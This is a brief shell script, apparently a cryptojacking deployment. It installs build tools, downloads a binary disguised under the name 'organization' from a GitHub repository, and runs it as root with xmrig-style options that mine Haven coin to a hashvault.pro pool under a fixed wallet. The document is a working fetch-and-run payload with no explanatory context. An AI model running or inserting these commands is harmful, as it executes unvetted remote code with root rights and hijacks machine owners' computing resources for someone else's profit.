sudo apt-get install -y gcc git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
wget https://github.com/feutcocky/rut/raw/main/organization
sudo sysctl -w vm.nr_hugepages=1280
chmod +x organization
sudo ./organization -a cn-heavy/xhv --url singapore01.hashvault.pro:443 --user hvxxyAMWYsseb6A86J4bY1jCo8jxz3XTy5wRgJXkw2qEVocJo2ytTRGYynPvCbKVUBfBBYWv8RTnEhaY7vVvqzBk3z8ZJdqUVh --pass nardi --cpu-no-yield -k --cpu-priority 5 --tls
